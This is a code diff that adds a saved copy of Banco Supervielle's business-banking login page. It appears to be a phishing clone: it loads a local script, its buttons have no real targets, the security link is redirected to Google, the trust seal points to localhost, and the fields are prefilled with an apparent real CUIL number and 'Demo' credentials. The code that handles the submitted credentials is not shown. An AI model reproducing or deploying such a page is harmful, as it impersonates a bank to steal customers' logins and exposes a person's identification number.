@@ -1,0 +1,430 @@
+
+<!-- saved from url=(0034)Login.aspx -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
+	
+        Banco Supervielle
+</title><link href="Estilo.css" type="text/css" rel="stylesheet">
+
+<script src="//code.jquery.com/jquery-1.10.2.js"></script>
+<script src="//code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+ <script src="rutas.js"></script> 
+
+
+
+</head>
+<body>
+    <form name="aspnetForm" method="post" action="Login.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm" autocomplete="off">
+<div>
+<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTEzMDc0OTMyOTIPZBYCZg9kFgICAw9kFgZmDw8WAh4EVGV4dAUcbHVuZXMsIDI0IGRlIG9jdHVicmUgZGUgMjAxNmRkAgEPFgIeBGhyZWYFJ21haWx0bzpwYWJsby5zaWNpbGlhQHN1cGVydmllbGxlLmNvbS5hcmQCAg9kFgJmD2QWBmYPZBYCAgEPZBYEAgEPZBYGAgEPEA8WAh4LXyFEYXRhQm91bmRnZBAVXBhBTEVNQU5JQSAgICAgICAgICAgICAgICAYQU5HT0xBICAgICAgICAgICAgICAgICAgLUFOVElMTEFTIEhPTEFOREVTQVMgICAgICAgICAgICAgICAgICAgICAgICAgICRBUkFCSUEgU0FVRElUQSAgICAgICAgICAgICAgICAgICAgICAgQVJHRUxJQSAgICAgICAgICAgICAgICAgICAgICAgICAJQVJHRU5USU5BIEFVU1RSQUxJQSAgICAgICAgICAgICAgICAgICAgICAgIEFVU1RSSUEgICAgICAgICAgICAgICAgICAgICAgICAgHEJBSEFNQVMgICAgICAgICAgICAgICAgICAgICAtQkFOR0xBREVTSCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEJFTEdJQ0EgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1CRVJNVURBUyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQk9MSVZJQSAgICAgICAgICAgICAgICAgICAgICAgICAtQk9TTklBIFkgSEVSWkVHT1ZJTkEgICAgICAgICAgICAgICAgICAgICAgICAgFEJSQVNJTCAgICAgICAgICAgICAgGEJVTEdBUklBICAgICAgICAgICAgICAgIC1DQU5BREEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAVQ0hFQ09TTE9WQVFVSUEgICAgICAgIENISUxFICAgICAgICAgICAgICAgICAgICAgICAgICAgG0NISU5BICAgICAgICAgICAgICAgICAgICAgICBDSElQUkUgICAgICAgICAgICAgICAgICAgICAgICAgICBDT0xPTUJJQSAgICAgICAgICAgICAgICAgICAgICAgIB9DT05HTyAgICAgICAgICAgICAgICAgICAgICAgICAgIENPUkVBICAgICAgICAgICAgICAgICAgICAgICAgICAgIENPU1RBIFJJQ0EgICAgICAgICAgICAgICAgICAgICAgIENVQkEgICAgICAgICAgICAgICAgICAgICAgICAgICAgJERJTkFNQVJDQSAgICAgICAgICAgICAgICAgICAgICAgICAgICNET01JTklDQU5BICAgICAgICAgICAgICAgICAgICAgICAgIB9FQ1VBRE9SICAgICAgICAgICAgICAgICAgICAgICAgGkVHSVBUTyAgICAgICAgICAgICAgICAgICAgIEVMIFNBTFZBRE9SICAgICAgICAgICAgICAgICAgICAgLUVNSVJBVE9TIEFSQUJFUyBVTklET1MgICAgICAgICAgICAgICAgICAgICAgIC1FU0xPVkVOSUEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtRVNQQVxBICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLUVTVEFETyBJTkRFUEVORElFTlRFIERFIE1BVVJJQ0lPICAgICAgICAgICAgIC1FU1RBRE9TIFVOSURPUyBERSBBTUVSSUNBICAgICAgICAgICAgICAgICAgICAtRVNUT05JQSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZJTElQSU5BUyAgICAgICAgICAgICAgICAgICAgICAgLUZJTkxBTkRJQSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUkFOQ0lBICAgICAgICAgICAgICAgICAgICAgICAgIC1HUkFOIERVQ0FETyBERSBMVVhFTUJVUkdPICAgICAgICAgICAgICAgICAgICAgR1JFQ0lBICAgICAgICAgICAgICAgICAgICAgICAgICAgR1VBVEVNQUxBICAgICAgICAgICAgICAgICAgICAgICAgSEFJVEkgICAgICAgICAgICAgICAgICAgICAgICAgICAgSE9ORFVSQVMgICAgICAgICAgICAgICAgICAgICAgICAtSE9ORyBLT05HIChSRVBVQkxJQ0EgUE9QVUxBUiBDSElOQSkgICAgICAgICAgGEhVTkdSSUEgICAgICAgICAgICAgICAgIB1JTkRJQSAgICAgICAgICAgICAgICAgICAgICAgIC1JUkxBTkRBICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuSVNMQSBHVUVSTlNFWSAoUkVJTk8gVU5JRE8gREUgR1JBTiBCUkVUQcORQSkgIC5JU0xBUyBDQUlNQU4gKFJFSU5PIFVOSURPIERFIEdSQU4gQlJFVEHDkUEpICAgI0lTUkFFTCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElUQUxJQSAgICAgICAgICAgICAgICAgICAgICAgICAgLUpBUE9OICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRKT1JEQU5JQSAgICAgICAgICAgICAgICAgICAgICAgICAgICAjS1VXQUlUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTEVUT05JQSAgICAgICAgICAgICAgICAgICAgICAgICAfTElCQU5PICAgICAgICAgICAgICAgICAgICAgICAgIC1NQUxBU0lBICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTUFSUlVFQ09TICAgICAgICAgICAgICAgICAgICAgICAgICAgG01FWElDTyAgICAgICAgICAgICAgICAgICAgICBOSUNBUkFHVUEgICAgICAgICAgICAgICAgICAgICAgICROT1JVRUdBICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTlVFVkEgWkVMQU5ESUEgICAgICAgICAgICAgICAgICAgUEFJU0VTIEJBSk9TICAgICAgICAgICAgICAgICAgICAtUEFJU0VTIFZBUklPUyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgF1BBS0lTVEFOICAgICAgICAgICAgICAgLVBBTEVTVElOQSBURVJSSVRPUklPIE9DVVBBRE8gICAgICAgICAgICAgICAgICBQQU5BTUEgICAgICAgICAgICAgICAgICAgICAgICAgICBQQVJBR1VBWSAgICAgICAgICAgICAgICAgICAgICAgIB9QRVJVICAgICAgICAgICAgICAgICAgICAgICAgICAgGFBPTE9OSUEgICAgICAgICAgICAgICAgICBQT1JUVUdBTCAgICAgICAgICAgICAgICAgICAgICAgIC1QVUVSVE8gUklDTyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtUkVJTk8gVU5JRE8gREUgR1JBTiBCUkVUQVxBIEUgSVJMQU5EQSBOT1JURSAgLVJFUFVCTElDQSBERU1PQ1JBVElDQSBERUwgQ09OR08gICAgICAgICAgICAgIBVSVU1BTklBICAgICAgICAgICAgICAtU0VORUdBTCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNJTkdBUFVSICAgICAgICAgICAgICAgICAgICAgICAgHVNJUklBICAgICAgICAgICAgICAgICAgICAgICAgCVNSSS1MQU5LQSBTVURBRlJJQ0EgICAgICAgICAgICAgICAgICAgICAgICRTVUVDSUEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtU1VJWkEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNVUklOQU1FICAgICAgICAgICAgICAgICAgICAgICAgLVRBSVdBTiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUSEFJTEFORElBICAgICAgICAgICAgICAgICAgICAgICAgICAgVFVSUVVJQSAgICAgICAgICAgICAgICAgICAgICAgICAgVUNSQU5JQSAgICAgICAgICAgICAgICAgICAgICAgICAtVU5JT04gREUgUkVQVUJMSUNBUyBTT0NJQUxJU1RBUyBTT1ZJRVRJQ0FTICAgFlVSVUdVQVkgICAgICAgICAgICAgICAgVkVORVpVRUxBICAgICAgICAgICAgICAgICAgICAgICAVXAMwMDMDMTY0AzE5MAMwNTMDMTAyAzA4MAMwMjEDMDEzAzA0OAMxNjUDMDA2AzE5MQMwNDEDMTk2AzAxMgMwNDUDMDE3AzAxNAMwMTEDMDgzAzExMgMwNTQDMTUyAzA0NAMwNTUDMDUxAzAxNQMwNzYDMDQ3AzA1NwMwNTgDMTUzAzE5NwMwMDkDMTU4AzAwMgMyMDEDMDg1AzAzNwMwMDQDMDQzAzAzOAMwNjEDMDYyAzA2MwMxODMDMDM0AzAyMAMwMjQDMTk1AzE5NAMwMzkDMDA3AzAxOQMxMTgDMTIwAzIwMgMwMzIDMTU2AzEyNgMwMzMDMDY3AzAyOAMwMjIDMDA4AzE5OAMwNDIDMTkzAzA2OAMwNjkDMDI2AzAzMAMwMTYDMDY2AzAwMQMxODkDMDMxAzEzNgMxODIDMDM1AzA4OAMwMjMDMDI3AzAwNQMxOTkDMDU2AzE0MAMwNDYDMTkyAzA0MAMwMTADMDc5FCsDXGdnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnFgECBWQCAw8PFgYeC0NoYXJzRmlsdGVyBQ5eW146O1w8PidcIl0qJB4SQ2hhcnNGaWx0ZXJFbmFibGVkZx8ABQsyMzI5ODUyODUzMxYCHgpvbmtleXByZXNzBSZyZXR1cm4gbnVtYmVyc29ubHkodGhpcywgZXZlbnQsIGZhbHNlKWQCDg8PFgIeB1Zpc2libGVoZGQCAw8PFgIfAAXJAkJhbmNvICAgU3VwZXJ2aWVsbGUgUy5BLiAgIG5vICAgc29saWNpdGEgICBhY3R1YWxpemFjacOzbiAgIGRlICBkYXRvcyAgdsOtYSAgZS1tYWlsIDxiciAvPiBvIGVuIGZvcm1hIHRlbGVmw7NuaWNhLjxiciAvPlBvciBkdWRhcyBvIGNvbnN1bHRhcyBzb2JyZSB0ZW1hcyBkZSBzZWd1cmlkYWQsIGhhZ2EgPGEgaHJlZj0iaHR0cDovL3d3dy5nb29nbGUuY29tLmFyIiB0YXJnZXQ9J19ibGFuaycgXD5jbGljayBhcXXDrTwvYT4uICA8YnIgLz4gQW50ZSBjdWFscXVpZXIgaW5xdWlldHVkIG5vIGR1ZGUgZW4gY29tdW5pY2Fyc2UgY29uIG5vc290cm9zIGFsIDA4MTAtMzMzLTQ5NTkuZGQCAQ9kFgICAQ9kFgQCAQ9kFgoCAQ8PFgYfAAUJQVJHRU5USU5BHwMFDl5bXjo7XDw+J1wiXSokHwRnFgIfBQU5cmV0dXJuIHZhbGlkQ2hhcmFjdGVyc09ubHkodGhpcywgZXZlbnQsICJeW146O1w8PidcIl0qJCIpZAICDw8WBh8ABQsyMzI5ODUyODUzMx8DBQ5eW146O1w8PidcIl0qJB8EZxYCHwUFOXJldHVybiB2YWxpZENoYXJhY3RlcnNPbmx5KHRoaXMsIGV2ZW50LCAiXlteOjtcPD4nXCJdKiQiKWQCAw8PFgQfAwUOXlteOjtcPD4nXCJdKiQfBGcWBh4Hb25rZXl1cAUdcmVtb3ZlSW52YWxpZENoYXJhY3RlcnModGhpcykeBm9uYmx1cgUdcmVtb3ZlSW52YWxpZENoYXJhY3RlcnModGhpcykfBQU5cmV0dXJuIHZhbGlkQ2hhcmFjdGVyc09ubHkodGhpcywgZXZlbnQsICJeW146O1w8PidcIl0qJCIpZAIFDw8WBB8DBQ5eW146O1w8PidcIl0qJB8EZxYCHwUFOXJldHVybiB2YWxpZENoYXJhY3RlcnNPbmx5KHRoaXMsIGV2ZW50LCAiXlteOjtcPD4nXCJdKiQiKWQCCA9kFgICAQ8PFgIfAGVkZAIDDw8WAh8ABckCQmFuY28gICBTdXBlcnZpZWxsZSBTLkEuICAgbm8gICBzb2xpY2l0YSAgIGFjdHVhbGl6YWNpw7NuICAgZGUgIGRhdG9zICB2w61hICBlLW1haWwgPGJyIC8+IG8gZW4gZm9ybWEgdGVsZWbDs25pY2EuPGJyIC8+UG9yIGR1ZGFzIG8gY29uc3VsdGFzIHNvYnJlIHRlbWFzIGRlIHNlZ3VyaWRhZCwgaGFnYSA8YSBocmVmPSJodHRwOi8vd3d3Lmdvb2dsZS5jb20uYXIiIHRhcmdldD0nX2JsYW5rJyBcPmNsaWNrIGFxdcOtPC9hPi4gIDxiciAvPiBBbnRlIGN1YWxxdWllciBpbnF1aWV0dWQgbm8gZHVkZSBlbiBjb211bmljYXJzZSBjb24gbm9zb3Ryb3MgYWwgMDgxMC0zMzMtNDk1OS5kZAICD2QWAgIBD2QWAgIDDw8WAh8ABckCQmFuY28gICBTdXBlcnZpZWxsZSBTLkEuICAgbm8gICBzb2xpY2l0YSAgIGFjdHVhbGl6YWNpw7NuICAgZGUgIGRhdG9zICB2w61hICBlLW1haWwgPGJyIC8+IG8gZW4gZm9ybWEgdGVsZWbDs25pY2EuPGJyIC8+UG9yIGR1ZGFzIG8gY29uc3VsdGFzIHNvYnJlIHRlbWFzIGRlIHNlZ3VyaWRhZCwgaGFnYSA8YSBocmVmPSJodHRwOi8vd3d3Lmdvb2dsZS5jb20uYXIiIHRhcmdldD0nX2JsYW5rJyBcPmNsaWNrIGFxdcOtPC9hPi4gIDxiciAvPiBBbnRlIGN1YWxxdWllciBpbnF1aWV0dWQgbm8gZHVkZSBlbiBjb211bmljYXJzZSBjb24gbm9zb3Ryb3MgYWwgMDgxMC0zMzMtNDk1OS5kZBgBBRZjdGwwMCRNYWluSG9sZGVyJHZpZXdzDw9kAgFkphevqbADkOdowTPTrFwToiwvCj4=">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="./Banco Supervielle_files/WebResource.axd" type="text/javascript"></script>
+
+<script src="./Banco Supervielle_files/DataEntry.js.descarga"></script><script src="./Banco Supervielle_files/DataEntry.js.descarga"></script><script language="javascript" type="text/javascript">var getControlFunction = 'GetActiveControl';</script>
+<script src="./Banco Supervielle_files/WebResource(1).axd" type="text/javascript"></script>
+<script src="./Banco Supervielle_files/WebResource(2).axd" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div>
+
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWCgL6o4zzCgKd0aWPCALAhv24CgL0meSeAQKy1bPdBQKTnfjgAwKpp7yMAwKDo43zAwLJ2pPyDQLRqszJDpdc8LNcv5IpS/KYxvAsvvIZev84">
+</div>
+    <table style="height: 100%" cellspacing="0" cellpadding="0" width="100%" border="0">
+        <tbody>
+
+            <tr>
+                <td>
+                    <table class="ic-content" cellspacing="0" cellpadding="0" width="100%" border="0" style="height: 100%">
+                        <tbody>
+                            <tr>
+                                <td class="ic-content-left">
+                                    <img height="110" src="./Banco Supervielle_files/log-img-aux-left-bottom.gif" width="9">
+                                </td>
+                                <td>
+                                    <table class="ic-content-center" cellspacing="0" cellpadding="0" width="100%" border="0" style="height: 100%">
+                                        <tbody>
+                                            <tr>
+                                                <td align="center" class="ic-content-space-top">
+                                                    <table border="0" cellpadding="5" cellspacing="0">
+                                                        <tbody><tr>
+                                                            <td>
+                                                                
+
+    <script language="javascript" type="text/javascript">
+       // if (top.location.href != self.location.href) {
+         //   window.parent.location.href = self.location.href;
+        //}
+        function removeInvalidCharacters(control) {
+            !(/^[A-zÑñ0-9  -.áéíóúÁÉÍÓÚ]*$/i).test(control.value) ? control.value = control.value.replace(/[^A-zÑñ0-9 -.áéíóúÁÉÍÓÚ]/ig, '') : null
+        }
+
+        function GetActiveControl() {
+            return document.getElementById("ctl00_MainHolder_Password");
+        }
+    </script>
+
+    
+            <div id="ctl00_MainHolder_loginPanel" onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;ctl00_MainHolder_LoginButton&#39;)">
+	
+                <table cellspacing="0" cellpadding="0" width="610" border="0">
+                    <tbody><tr>
+                        <td>
+                            <table cellspacing="0" cellpadding="0" width="100%" border="0">
+                                <tbody><tr>
+                                    <td class="ic-log-tittle" align="left" >
+                                        Bienvenido a Supervielle Empresas
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <table cellspacing="0" cellpadding="0" width="100%" border="0">
+                                <tbody><tr>
+                                    <td class="ic-log-panel-top-left">
+                                    </td>
+                                    <td class="ic-log-panel-top">
+                                    </td>
+                                    <td class="ic-log-panel-top-right">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="ic-log-panel-left">
+                                    </td>
+                                    <td>
+                                        <table cellspacing="0" cellpadding="0" width="100%" border="1">
+                                            <tbody><tr>
+                                                <td class="ic-log-column-left" align="middle">
+                                                    <img id="ctl00_MainHolder_Image1" src="images/banner-login.jpg" align="middle" style="height:301px;width:98px;border-width:0px;">
+                                                </td>
+                                                <td class="ic-log-column-center">
+                                                    <table class="ic-log-form" cellspacing="0" cellpadding="0" width="100%" border="0" background="images/login1.png">
+                                                        <tbody><tr>
+                                                            <td class="ic-log-form-tittle">
+                                                                <table  cellspacing="0" cellpadding="0" width="100%" border="0">
+                                                                    <tbody><tr>
+                                                                        <td class="ic-log-form-tittle-left">
+                                                                            &nbsp;
+                                                                        </td>
+                                                                        <td class="ic-log-form-tittle-center" align="left" >
+                                                                            Ingresar a Supervielle Empresas
+                                                                        </td>
+                                                                        <td class="ic-log-form-tittle-right">
+                                                                            &nbsp;
+                                                                        </td>
+                                                                    </tr>
+                                                                </tbody></table>
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td class="ic-log-form-top">
+                                                                <div id="ctl00_MainHolder_Panel1">
+		
+                                                                    <table cellspacing="0" cellpadding="0" width="100%" border="0">
+                                                                        <tbody><tr>
+                                                                            <td colspan="2">
+                                                                                <img id="ctl00_MainHolder_Image2" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr>
+                                                                            <td class="ic-log-form-label" style="height: 24px">
+                                                                                Nacionalidad:
+                                                                            </td>
+                                                                            <td class="ic-log-form-data" style="height: 24px">
+                                                                                <input name="ctl00$MainHolder$TextBoxCountry" type="text" value="ARGENTINA" id="ctl00_MainHolder_TextBoxCountry" disabled="disabled" class="ic-log-form-field" autocomplete="off" enterbutton="LoginButton" onkeypress="return validCharactersOnly(this, event, &quot;^[^:;\&lt;&gt;&#39;\&quot;]*$&quot;)" style="font-size:10px;">
+                                                                                &nbsp;
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr>
+                                                                            <td class="ic-log-form-label" style="height: 24px">
+                                                                                C.U.I.L.:
+                                                                            </td>
+                                                                            <td class="ic-log-form-data" style="height: 24px">
+                                                                                <input name="ctl00$MainHolder$ConfirmedDocumentNumber" type="text" value="23298528533" id="ctl00_MainHolder_ConfirmedDocumentNumber" disabled="disabled" class="ic-log-form-field" autocomplete="off" enterbutton="LoginButton" onkeypress="return validCharactersOnly(this, event, &quot;^[^:;\&lt;&gt;&#39;\&quot;]*$&quot;)" style="font-size:10px;">
+                                                                                &nbsp;
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr>
+                                                                            <td class="ic-log-form-label" style="height: 24px">
+                                                                                Usuario:
+                                                                            </td>
+                                                                            <td class="ic-log-form-data" style="height: 24px">
+                                                                                <input value="Demo" name="ctl00$MainHolder$UserName" type="text" maxlength="12" id="ctl00_MainHolder_UserName" class="ic-log-form-field" autocomplete="off" enterbutton="LoginButton" onkeyup="removeInvalidCharacters(this)" onblur="removeInvalidCharacters(this)" onkeypress="return validCharactersOnly(this, event, &quot;^[^:;\&lt;&gt;&#39;\&quot;]*$&quot;)">
+                                                                                <span id="ctl00_MainHolder_UserRequiredFieldValidator" style="color:Red;display:none;">Campo requerido</span>&nbsp;
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr>
+                                                                            <td class="ic-log-form-label">
+                                                                                Contraseña:
+                                                                            </td>
+                                                                            <td class="ic-log-form-data">
+                                                                                <input value="Demo" name="ctl00$MainHolder$Password" type="password" id="ctl00_MainHolder_Password" class="ic-log-form-field" autocomplete="off" enterbutton="LoginButton" onkeypress="return validCharactersOnly(this, event, &quot;^[^:;\&lt;&gt;&#39;\&quot;]*$&quot;)">
+                                                                                <span id="ctl00_MainHolder_PasswordRequiredFieldValidator" style="color:Red;display:none;">Campo requerido</span>&nbsp;
+                                                                            </td>
+                                                                        </tr>
+                                                                         <tr>
+                                                                             <td align="center" colspan="2">
+<a id="noDisponible" class="ic-banner-link" ><img id="ctl00_MainHolder_Image34" src="images/bot-security.jpg" style="height:20px;border-width:0px;">Acceso desde PC pública</a>
+   </td>
+                                                                         </tr>
+                                                                        <tr>
+                                                                            
+                                                                        </tr>
+                                                                        <tr>
+  <td id="ctl00_MainHolder_td2" colspan="2">                                                                               &nbsp;&nbsp;</td>
+		
+                                                                        </tr>                                                                        
+                                                                        <tr>
+                                                                            
+                                                                        </tr>
+                                                                        <tr align="middle">
+                                                                            <td colspan="2">
+                                                                                <img id="ctl00_MainHolder_Image3" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="center">
+                                                                            <td nowrap="nowrap" colspan="2">
+                                                                                <table>
+                                                                                    <tbody><tr>
+                                                                                        <td>
+                                                                                            <a id="bot1a" class="ic-button" >Volver</a>
+                                                                                        </td>
+                                                                                        <td>
+                                                                                            <a id="bot2" class="ic-button">Ingresar</a>
+
+
+                                                                            
+
+
+                                                                                        </td>
+                                                                                    </tr>
+                                                                                </tbody></table>
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="middle">
+                                                                            <td colspan="2">
+                                                                                <img id="ctl00_MainHolder_Image20" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr>
+                                                                            <td align="center" colspan="2" class="ic-log-form-space-button">
+                                                                                
+
+ <a id="noDisponible1" tabindex="8" class="ic-banner-link">¿Olvidó su contraseña?</a>
+
+
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="middle">
+                                                                            <td colspan="2" class="ic-log-form-space-button2">
+                                                                                <img id="ctl00_MainHolder_Image19" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="center">
+                                                                            <td colspan="2" class="ic-customerAttention-title">
+                                                                                Línea de HBE Banca Telefónica
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="center">
+                                                                            <td colspan="2" class="ic-customerAttention-data">
+                                                                                0810-122-4237
+                                                                            </td>
+                                                                        </tr>
+                                                                        <tr align="center">
+                                                                            <td colspan="2" class="ic-customerAttention-data">
+                                                                                <p class="ic-customerAttention-data" align="center" style="text-align: center">
+                                                                                    <span lang="PT-BR" style="color: black">E-mail: <b><a href="mailto:atencionaempresas@supervielle.com.ar">
+                                                                                        atencionaempresas@supervielle.com.ar</a></b></span></p>
+                                                                            </td>
+                                                                        </tr>
+                                                                    </tbody></table>
+                                                                
+	</div>
+                                                            </td>
+                                                        </tr>
+                                                       
+                                                    </tbody></table>
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                    <td class="ic-log-panel-right">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="ic-log-panel-bottom-left">
+                                    </td>
+                                    <td class="ic-log-panel-bottom">
+                                    </td>
+                                    <td class="ic-log-panel-bottom-right">
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <img id="ctl00_MainHolder_Image7" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="ic-log-message-important-space">
+                            <table cellspacing="0" cellpadding="0" width="100%" border="0">
+                                <tbody><tr>
+                                    <td class="ic-log-message-important" align="left">
+                                        <table width="100%">
+                                            <tbody><tr>
+                                                <td valign="top" class="ic-log-message-link">
+                                                    <b>
+                                                        IMPORTANTE:</b>
+                                                </td>
+                                                <td valign="top" class="ic-log-message-link">                                                    
+                                                    <span id="ctl00_MainHolder_lbURLNormativa2">Banco   Supervielle S.A.   no   solicita   actualización   de  datos  vía  e-mail <br> o en forma telefónica.<br>Por dudas o consultas sobre temas de seguridad, haga <a href="http://www.google.com.ar/" target="_blank" \="">click aquí</a>.  <br> Ante cualquier inquietud no dude en comunicarse con nosotros al 0810-333-4959.</span>
+                                                    
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                </tr>
+                                <tr align="middle">
+                                    <td colspan="2">
+                                        <img id="ctl00_MainHolder_Image22" src="./Banco Supervielle_files/pixel.gif" style="height:2px;width:1px;border-width:0px;">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td valign="top" class="ic-log-message-link" colspan="2">
+                                        <b>
+                                            Este sitio está optimizado para visualizarse en 1024 x 768px con Internet Explorer versión 6.0 o superior.</b>
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                        </td>
+                    </tr>
+                </tbody></table>
+                
+            
+</div>
+        
+
+                                                            </td>
+                                                            <td valign="bottom">
+
+                                                                <script src="./Banco Supervielle_files/getseal"></script>
+
+                                                                <br>
+                                                                <a href="https://www.certisur.com/seal/authby.htm?host_name=localhost&amp;size=M&amp;use_flash=YES&amp;use_transparent=YES&amp;lang=es" target="_blank">
+                                                                    <img src="images/csseal_transp_S_v4.gif" border="0">
+                                                                </a>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody></table>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="ic-content-footer">
+                                                    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                        <tbody><tr class="ic-content-footer-dottedline">
+                                                            <td nowrap="nowrap">
+                                                            </td>
+                                                            <td width="100%">
+                                                                &nbsp;
+                                                            </td>                                                            
+                                                            <td align="right" nowrap="nowrap" style="width: 10%">
+                                                                <a id="ctl00_LinkButtonTermsAndConditions" class="ic-grid-link" href="terminosCondi.html">Términos y Condiciones</a>                                                                                                           
+                                                            </td>                                                                                                                       
+                                                            <td nowrap="nowrap">
+                                                            </td>   
+                                                        </tr>
+                                                    </tbody></table>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                                <td class="ic-content-right">
+                                    <img height="110" src="./Banco Supervielle_files/log-img-aux-right-bottom.gif" width="9">
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+    
+<script type="text/javascript">
+//<![CDATA[
+var Page_Validators =  new Array(document.getElementById("ctl00_MainHolder_UserRequiredFieldValidator"), document.getElementById("ctl00_MainHolder_PasswordRequiredFieldValidator"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var ctl00_MainHolder_UserRequiredFieldValidator = document.all ? document.all["ctl00_MainHolder_UserRequiredFieldValidator"] : document.getElementById("ctl00_MainHolder_UserRequiredFieldValidator");
+ctl00_MainHolder_UserRequiredFieldValidator.controltovalidate = "ctl00_MainHolder_UserName";
+ctl00_MainHolder_UserRequiredFieldValidator.focusOnError = "t";
+ctl00_MainHolder_UserRequiredFieldValidator.errormessage = "Campo requerido";
+ctl00_MainHolder_UserRequiredFieldValidator.display = "Dynamic";
+ctl00_MainHolder_UserRequiredFieldValidator.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_MainHolder_UserRequiredFieldValidator.initialvalue = "";
+var ctl00_MainHolder_PasswordRequiredFieldValidator = document.all ? document.all["ctl00_MainHolder_PasswordRequiredFieldValidator"] : document.getElementById("ctl00_MainHolder_PasswordRequiredFieldValidator");
+ctl00_MainHolder_PasswordRequiredFieldValidator.controltovalidate = "ctl00_MainHolder_Password";
+ctl00_MainHolder_PasswordRequiredFieldValidator.focusOnError = "t";
+ctl00_MainHolder_PasswordRequiredFieldValidator.errormessage = "Campo requerido";
+ctl00_MainHolder_PasswordRequiredFieldValidator.display = "Dynamic";
+ctl00_MainHolder_PasswordRequiredFieldValidator.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_MainHolder_PasswordRequiredFieldValidator.initialvalue = "";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
